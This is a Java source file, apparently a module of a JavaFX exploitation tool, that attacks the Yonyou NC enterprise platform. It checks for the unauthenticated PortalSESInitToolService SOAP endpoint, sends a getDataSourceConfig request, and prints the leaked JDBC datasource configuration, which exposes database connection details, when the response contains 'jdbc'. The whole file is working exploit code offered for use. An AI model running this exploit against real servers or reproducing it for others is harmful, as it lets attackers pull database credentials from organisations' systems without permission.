package exp.oa.yongyou.nc;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class yongyou_nc_PortalSESInitToolService_info implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为信息泄露，请访问url进行测试");
        });
        return null;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {

            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response get_res = HttpTools.get(url + "/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService" , head, "utf-8");
            if (get_res.getCode() != 404 && get_res.getCode()!=0 ) {
                String var = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:por=\"http://inittool.ses.itf.nc/PortalSESInitToolService\">\n" +
                        "         <soapenv:Header/>\n" +
                        "         <soapenv:Body>\n" +
                        "            <por:getDataSourceConfig/>\n" +
                        "         </soapenv:Body>\n" +
                        "         </soapenv:Envelope>";
                Response post = HttpTools.post(url + "/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService",var,head,"utf-8");
                if(post.getText().contains("jdbc")){
                    Platform.runLater(() -> {
                        textArea.appendText("\n [ yongyou_nc_PortalSESInitToolService_info ]");
                        textArea.appendText("\n 存在PortalSESInitToolService接口，info获取成功");
                        textArea_cmd.appendText("\n ----------PortalSESInitToolService-----------\n"+post.getText());
                        textArea.appendText("\n");
                    });
                }
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

    }
}
